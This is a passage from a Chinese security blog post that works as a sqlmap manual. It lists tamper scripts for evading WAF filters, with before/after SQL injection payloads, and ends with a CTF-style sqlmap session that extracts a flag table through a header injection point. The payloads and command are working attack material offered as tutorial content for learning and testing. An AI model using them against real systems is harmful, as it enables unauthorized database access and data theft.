+<p>在以下版本做过测试:</p>
+<p>All</p>
+<p><strong>12:sp_password.py</strong></p>
+<p>作用：追加<code>sp_password’</code>从DBMS日志的自动模糊处理的有效载荷的末尾</p>
+<p>示例：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1 AND <span class="number">9227</span>=<span class="number">9227</span>-- &#x27;</span><br><span class="line">&#x27;1 AND <span class="number">9227</span>=<span class="number">9227</span>-- sp_password&#x27;</span><br></pre></td></tr></table></figure>
+<p>版本要求: <code>* MSSQL</code></p>
+<h1 id="针对过滤引号的："><a href="#针对过滤引号的：" class="headerlink" title="针对过滤引号的："></a>针对过滤引号的：</h1><p><strong>1:apostrophemask.py</strong></p>
+<p>作用：用<code>utf8</code>代替单引号</p>
+<p>示例：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">&#x27;<span class="number">1</span> AND <span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%871</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%87</span><span class="operator">=</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%871</span>&#x27;</span><br></pre></td></tr></table></figure>
+<p>在以下版本做过测试:</p>
+<p>all</p>
+<p><strong>2:apostrophenullencode.py</strong></p>
+<p>作用：绕过过滤双引号，替换字符和双引号。</p>
+<p>示例：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line">&#x27;<span class="number">1</span> AND <span class="variable">%00</span><span class="variable">%271</span><span class="variable">%00</span><span class="variable">%27</span><span class="operator">=</span><span class="variable">%00</span><span class="variable">%271</span>&#x27;</span><br></pre></td></tr></table></figure>
+<p>在以下版本做过测试:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">MySQL</span> <span class="number">4</span>, <span class="number">5</span>.<span class="number">0</span> and <span class="number">5</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Oracle</span> <span class="number">10</span>g</span><br><span class="line"><span class="attribute">PostgreSQL</span> <span class="number">8</span>.<span class="number">3</span>, <span class="number">8</span>.<span class="number">4</span>, <span class="number">9</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h1 id="针对过滤关键字的："><a href="#针对过滤关键字的：" class="headerlink" title="针对过滤关键字的："></a>针对过滤关键字的：</h1><p><strong>1:halfversionedmorekeywords.py</strong></p>
+<p>作用：当数据库为<code>mysql</code>时绕过防火墙，每个关键字之前添加<code>mysql</code>版本评论</p>
+<p>示例：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&quot;value&#x27; UNION ALL <span class="keyword">SELECT</span> CONCAT(CHAR(<span class="number">58</span>,<span class="number">107</span>,<span class="number">112</span>,<span class="number">113</span>,<span class="number">58</span>),<span class="built_in">IFNULL</span>(<span class="keyword">CAST</span>(CURRENT_USER() <span class="keyword">AS</span> CHAR),CHAR(<span class="number">32</span>)),CHAR(<span class="number">58</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">121</span>,<span class="number">58</span>)), <span class="literal">NULL</span>, <span class="literal">NULL</span># <span class="keyword">AND</span> <span class="string">&#x27;QDWa&#x27;</span>=<span class="string">&#x27;QDWa&quot;) &quot;value&#x27;</span><span class="comment">/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#x27;QDWa&#x27;=&#x27;QDWa&quot;</span></span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL &lt; 5.1</span><br><span class="line"><span class="section">在以下版本做过测试:</span></span><br><span class="line">MySQL 4.0.18, 5.0.22</span><br></pre></td></tr></table></figure>
+<p><strong>2:ifnull2ifisnull.py</strong></p>
+<p>作用：绕过对<code>IFNULL</code>过滤。 替换类似<code>’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</code></p>
+<p>示例：</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&#x27;IFNULL</span>(<span class="name">1</span>, <span class="number">2</span>)&#x27;</span><br><span class="line"><span class="symbol">&#x27;IF</span>(<span class="name">ISNULL</span>(<span class="name">1</span>),<span class="number">2</span>,<span class="number">1</span>)&#x27;</span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">MySQL</span></span><br><span class="line"><span class="selector-tag">SQLite</span> (possibly)</span><br><span class="line"><span class="selector-tag">SAP</span> <span class="selector-tag">MaxDB</span> (possibly)</span><br><span class="line">在以下版本做过测试:</span><br><span class="line"><span class="selector-tag">MySQL</span> <span class="selector-tag">5</span><span class="selector-class">.0</span> <span class="selector-tag">and</span> <span class="selector-tag">5</span><span class="selector-class">.5</span></span><br></pre></td></tr></table></figure>
+<p><strong>3:multiplespaces.py</strong></p>
+<p>作用：围绕SQL关键字添加多个空格</p>
+<p>示例：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="number">1</span> <span class="built_in">UNION</span> <span class="built_in">SELECT</span> foobar&#x27;</span><br><span class="line">&#x27;<span class="number">1</span> <span class="built_in">UNION</span> <span class="built_in">SELECT</span> foobar&#x27;</span><br></pre></td></tr></table></figure>
+<p>在以下版本做过测试:</p>
+<p>All</p>
+<p><strong>4:halfversionedmorekeywords.py</strong></p>
+<p>作用：关键字前加注释</p>
+<p>示例：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">value</span>’ UNION <span class="literal">ALL</span> SELECT CONCAT(CHAR(<span class="number">58</span>,<span class="number">107</span>,<span class="number">112</span>,<span class="number">113</span>,<span class="number">58</span>),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(<span class="number">32</span>)),CHAR(<span class="number">58</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">121</span>,<span class="number">58</span>)), NULL, NULL# AND ‘QDWa’=&#x27;QDWa </span><br><span class="line"><span class="attribute">value</span>’/*!<span class="number">0</span>UNION/*!<span class="number">0</span><span class="literal">ALL</span>/*!<span class="number">0</span>SELECT/*!<span class="number">0</span>CONCAT(/*!<span class="number">0</span>CHAR(<span class="number">58</span>,<span class="number">107</span>,<span class="number">112</span>,<span class="number">113</span>,<span class="number">58</span>),/*!<span class="number">0</span>IFNULL(CAST(/*!<span class="number">0</span>CURRENT_USER()/*!<span class="number">0</span>AS/*!<span class="number">0</span>CHAR),/*!<span class="number">0</span>CHAR(<span class="number">32</span>)),/*!<span class="number">0</span>CHAR(<span class="number">58</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">121</span>,<span class="number">58</span>)), NULL, NULL#/*!<span class="number">0</span>AND ‘QDWa’=&#x27;QDWa</span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MySQL &lt; 5.1</span><br><span class="line"><span class="section">在以下版本做过测试:</span></span><br><span class="line">MySQL 4.0.18, 5.0.22</span><br></pre></td></tr></table></figure>
+<p><strong>5:unionalltounion.py</strong></p>
+<p>作用：替换UNION ALL SELECT UNION SELECT</p>
+<p>示例：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="number">-1</span> <span class="built_in">UNION</span> ALL <span class="built_in">SELECT</span>&#x27;</span><br><span class="line">&#x27;<span class="number">-1</span> <span class="built_in">UNION</span> <span class="built_in">SELECT</span>&#x27;</span><br></pre></td></tr></table></figure>
+<p>版本要求: all</p>
+<p><strong>6:randomcomments.py</strong></p>
+<p>作用：用/**/分割sql关键字</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">‘INSERT’</span><br><span class="line">‘IN<span class="regexp">//</span>S<span class="regexp">//</span>ERT’</span><br></pre></td></tr></table></figure>
+<p><strong>7:unmagicquotes.py</strong></p>
+<p>作用：宽字符绕过 GPC addslashes</p>
+<p>示例：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>’ AND <span class="number">1</span>=<span class="number">1</span> </span><br><span class="line"> <span class="attribute">1</span>%bf%<span class="number">27</span> AND <span class="number">1</span>=<span class="number">1</span>–%<span class="number">20</span></span><br><span class="line"><span class="attribute">8</span>:randomcase.py</span><br></pre></td></tr></table></figure>
+<p>作用：随机大小写</p>
+<p>示例：<br>INSERT<br>InsERt<br>在以下版本做过测试:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Microsoft</span> SQL Server <span class="number">2005</span></span><br><span class="line"><span class="attribute">MySQL</span> <span class="number">4</span>, <span class="number">5</span>.<span class="number">0</span> and <span class="number">5</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Oracle</span> <span class="number">10</span>g</span><br><span class="line"><span class="attribute">PostgreSQL</span> <span class="number">8</span>.<span class="number">3</span>, <span class="number">8</span>.<span class="number">4</span>, <span class="number">9</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h1 id="针对过滤比较符号的："><a href="#针对过滤比较符号的：" class="headerlink" title="针对过滤比较符号的："></a>针对过滤比较符号的：</h1><p><strong>1:equaltolike.py</strong></p>
+<p>作用：like 代替等号</p>
+<p>示例：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id=<span class="number">1</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="keyword">LIKE</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><strong>2:greatest.py</strong></p>
+<p>作用：绕过过滤’&gt;’ ,用GREATEST替换大于号。</p>
+<p>示例：</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27;1 AND A &gt; B&#x27;</span></span><br><span class="line"><span class="comment">&#x27;1 AND GREATEST(A,B+1)=A&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>在以下版本做过测试:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">MySQL</span> <span class="number">4</span>, <span class="number">5</span>.<span class="number">0</span> and <span class="number">5</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Oracle</span> <span class="number">10</span>g</span><br><span class="line"><span class="attribute">PostgreSQL</span> <span class="number">8</span>.<span class="number">3</span>, <span class="number">8</span>.<span class="number">4</span>, <span class="number">9</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p><strong>3:between.py</strong></p>
+<p>作用：用between替换大于号（&gt;）</p>
+<p>示例：</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27;1 AND A &gt; B--&#x27;</span></span><br><span class="line"><span class="comment">&#x27;1 AND A NOT BETWEEN 0 AND B--&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>在以下版本做过测试:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Microsoft</span> SQL Server <span class="number">2005</span> MySQL <span class="number">4</span>, <span class="number">5</span>.<span class="number">0</span> and <span class="number">5</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Oracle</span> <span class="number">10</span>g</span><br><span class="line"><span class="attribute">PostgreSQL</span> <span class="number">8</span>.<span class="number">3</span>, <span class="number">8</span>.<span class="number">4</span>, <span class="number">9</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<h1 id="其他类型："><a href="#其他类型：" class="headerlink" title="其他类型："></a>其他类型：</h1><p><strong>1:versionedmorekeywords.py</strong></p>
+<p>作用：注释绕过</p>
+<p>示例：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span> UNION <span class="literal">ALL</span> SELECT NULL, NULL, CONCAT(CHAR(<span class="number">58</span>,<span class="number">122</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">58</span>),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(<span class="number">32</span>)),CHAR(<span class="number">58</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">58</span>))# </span><br><span class="line"><span class="attribute">1</span>/*!UNION**!<span class="literal">ALL</span>**!SELECT**!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(<span class="number">58</span>,<span class="number">122</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">58</span>),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS**!CHAR*/),/*!CHAR*/(<span class="number">32</span>)),/*!CHAR*/(<span class="number">58</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">58</span>))#</span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">MySQL</span> &gt;= <span class="number">5</span>.<span class="number">1</span>.<span class="number">13</span></span><br></pre></td></tr></table></figure>
+<p><strong>2:securesphere.py</strong></p>
+<p>作用：追加特制的字符串</p>
+<p>示例：</p>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;1 AND 1=1&#x27;</span></span><br><span class="line">&quot;1 AND 1=1 and <span class="string">&#x27;0having&#x27;</span>=<span class="string">&#x27;0having&#x27;</span>&quot;</span><br></pre></td></tr></table></figure>
+<p>在以下版本做过测试:</p>
+<p>All</p>
+<p><strong>3:charunicodeencode.py</strong></p>
+<p>作用：字符串 unicode 编码</p>
+<p>示例：</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">SELECT</span> FIELD%20FROM <span class="meta">TABLE</span></span><br><span class="line"><span class="name">%u0053</span><span class="name">%u0045</span><span class="name">%u004c</span><span class="name">%u0045</span><span class="name">%u0043</span><span class="name">%u0054</span><span class="name">%u0020</span><span class="name">%u0046</span><span class="name">%u0049</span><span class="name">%u0045</span><span class="name">%u004c</span><span class="name">%u0044</span><span class="name">%u0020</span><span class="name">%u0046</span><span class="name">%u0052</span><span class="name">%u004f</span><span class="name">%u004d</span><span class="name">%u0020</span><span class="name">%u0054</span><span class="name">%u0041</span><span class="name">%u0042</span><span class="name">%u004c</span><span class="name">%u0045</span>′</span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ASP</span><br><span class="line">ASP.NET</span><br><span class="line">在以下版本做过测试:</span><br><span class="line">Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span> <span class="number">2000</span></span><br><span class="line">Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span> <span class="number">2005</span></span><br><span class="line">MySQL <span class="number">5.1</span><span class="number">.56</span></span><br><span class="line">PostgreSQL <span class="number">9.0</span><span class="number">.3</span></span><br></pre></td></tr></table></figure>
+<p><strong>4:charencode.py</strong></p>
+<p>作用：url编码</p>
+<p>示例：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM<span class="variable">%20</span>TABLE</span><br><span class="line"><span class="variable">%53</span><span class="variable">%45</span><span class="variable">%4</span><span class="keyword">c</span><span class="variable">%45</span><span class="variable">%43</span><span class="variable">%54</span><span class="variable">%20</span><span class="variable">%46</span><span class="variable">%49</span><span class="variable">%45</span><span class="variable">%4</span><span class="keyword">c</span><span class="variable">%44</span><span class="variable">%20</span><span class="variable">%46</span><span class="variable">%52</span><span class="variable">%4</span>f<span class="variable">%4</span>d<span class="variable">%20</span><span class="variable">%54</span><span class="variable">%41</span><span class="variable">%42</span><span class="variable">%4</span><span class="keyword">c</span><span class="variable">%45</span></span><br></pre></td></tr></table></figure>
+<p>在以下版本做过测试:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Microsoft</span> SQL Server <span class="number">2005</span></span><br><span class="line"><span class="attribute">MySQL</span> <span class="number">4</span>, <span class="number">5</span>.<span class="number">0</span> and <span class="number">5</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">Oracle</span> <span class="number">10</span>g</span><br><span class="line"><span class="attribute">PostgreSQL</span> <span class="number">8</span>.<span class="number">3</span>, <span class="number">8</span>.<span class="number">4</span>, <span class="number">9</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p><strong>5:appendnullbyte.py</strong></p>
+<p>作用：在有效负荷结束位置加载零字节字符编码</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">‘1 <span class="keyword">AND</span> <span class="attribute">1</span>=1’</span><br><span class="line">‘1 <span class="keyword">AND</span> <span class="attribute">1</span>=1%00’</span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft <span class="keyword">Access</span></span><br></pre></td></tr></table></figure>
+<p><strong>6:chardoubleencode.py</strong></p>
+<p>作用: 双url编码(不处理以编码的)</p>
+<p>示例：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD FROM<span class="variable">%20</span>TABLE </span><br><span class="line"><span class="variable">%2553</span><span class="variable">%2545</span><span class="variable">%254</span><span class="keyword">c</span><span class="variable">%2545</span><span class="variable">%2543</span><span class="variable">%2554</span><span class="variable">%2520</span><span class="variable">%2546</span><span class="variable">%2549</span><span class="variable">%2545</span><span class="variable">%254</span><span class="keyword">c</span><span class="variable">%2544</span><span class="variable">%2520</span><span class="variable">%2546</span><span class="variable">%2552</span><span class="variable">%254</span>f<span class="variable">%254</span>d<span class="variable">%2520</span><span class="variable">%2554</span><span class="variable">%2541</span><span class="variable">%2542</span><span class="variable">%254</span><span class="keyword">c</span><span class="variable">%2545</span></span><br></pre></td></tr></table></figure>
+<p><strong>7:base64encode.py</strong></p>
+<p>作用：用<code>base64</code>编码替换</p>
+<p>示例：</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;1&#x27; AND SLEEP(5)#&quot;</span></span><br><span class="line"><span class="symbol">&#x27;MScgQU5EIFNMRUVQKDUpIw==</span>&#x27;</span><br></pre></td></tr></table></figure>
+<p>版本要求:</p>
+<p>all</p>
+<p><strong>8:nonrecursivereplacement.py</strong></p>
+<p>作用：双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters</p>
+<p>示例：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="number">1</span> UNION <span class="keyword">SELECT</span> <span class="number">2</span><span class="comment">--&#x27;</span></span><br><span class="line">&#x27;<span class="number">1</span> UNIOUNIONN SELESELECTCT <span class="number">2</span><span class="comment">--&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>在以下版本做过测试:</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">all</span></span><br></pre></td></tr></table></figure>
+<p>后续内容将会继续更新。。。。。。。。。</p>
+<p>参考资料：</p>
+<p>安全牛课堂-kali-linux-web篇</p>
+<p>sqlmap用户手册中文版：<a target="_blank" rel="noopener" href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html">https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Introduction.html</a></p>
+<p>sqlmap用户手册：<a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-143.html">http://drops.xmd5.com/static/drops/tips-143.html</a></p>
+<p>例子：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;https://[REDACTED]/server.php&quot;</span> <span class="params">--header</span> <span class="string">&quot;Status: *&quot;</span> <span class="params">--prefix</span> <span class="string">&quot;3&#x27;&quot;</span> <span class="params">--suffix</span> <span class="string">&quot;#&quot;</span> <span class="params">--tamper</span> <span class="string">&quot;randomcase,space2comment&quot;</span> -A <span class="string">&quot;&quot;</span> <span class="params">--dbms</span> mysql <span class="params">--string</span> <span class="string">&quot;HTTP 401 Unauthorized&quot;</span> <span class="params">--technique=B</span> <span class="params">--sql-shell</span> <span class="params">--threads=8</span></span><br><span class="line"><span class="comment"># ...[OMITTED]...</span></span><br><span class="line">[69<span class="function">:69</span><span class="function">:69</span>] [INFO] <span class="params">(custom)</span> HEADER parameter &#x27;Status <span class="comment">#1*&#x27; appears to be &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27; injectable </span></span><br><span class="line">[69<span class="function">:69</span><span class="function">:69</span>] [INFO] checking <span class="keyword">if</span> the injection point on <span class="params">(custom)</span> HEADER parameter &#x27;Status <span class="comment">#1*&#x27; is a false positive</span></span><br><span class="line"><span class="params">(custom)</span> HEADER parameter &#x27;Status <span class="comment">#1*&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line">sqlmap identified the following injection point<span class="params">(s)</span> with a total of 10 HTTP<span class="params">(s)</span> requests:</span><br><span class="line"><span class="params">---</span></span><br><span class="line">Parameter: Status <span class="comment">#1* ((custom) HEADER)</span></span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: 3&#x27; AND 114514=114514<span class="comment">#</span></span><br><span class="line"><span class="params">---</span></span><br><span class="line"><span class="comment"># ...[OMITTED]...</span></span><br><span class="line">sql-shell&gt; SELECT table_name FROM information_schema.tables WHERE table_schema=database<span class="params">()</span></span><br><span class="line"><span class="comment"># ...[OMITTED]...</span></span><br><span class="line">[*] f1111111144444444444g</span><br><span class="line">[*] status</span><br><span class="line"></span><br><span class="line">sql-shell&gt; SELECT column_name FROM information_schema.columns WHERE table_name=&#x27;f1111111144444444444g&#x27;</span><br><span class="line"><span class="comment"># ...[OMITTED]...</span></span><br><span class="line">[*] ffffff14gggggg</span><br><span class="line"></span><br><span class="line">sql-shell&gt; SELECT ffffff14gggggg FROM f1111111144444444444g</span><br><span class="line"><span class="comment"># ...[OMITTED]...</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>安小琪
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://npfs06.top/2020/11/23/sqlmap%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" title="sqlmap使用手册">https://npfs06.top/2020/11/23/sqlmap使用手册/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/14/UNCTF2020/" rel="prev" title="UNCTF2020">
+      <i class="fa fa-chevron-left"></i> UNCTF2020
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/12/29/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="next" title="Nodejs原型链污染">
+      Nodejs原型链污染 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">寻找注入点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.</span> <span class="nav-text">查看数据库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E7%89%B9%E6%AE%8A%E6%93%8D%E4%BD%9C"><span class="nav-number">3.</span> <span class="nav-text">执行特殊操作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%80%BB%E8%A7%88"><span class="nav-number">4.</span> <span class="nav-text">命令总览</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD"><span class="nav-number">5.</span> <span class="nav-text">注入判断</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%A8%E6%9D%A5%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">6.</span> <span class="nav-text">用来连接数据库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" 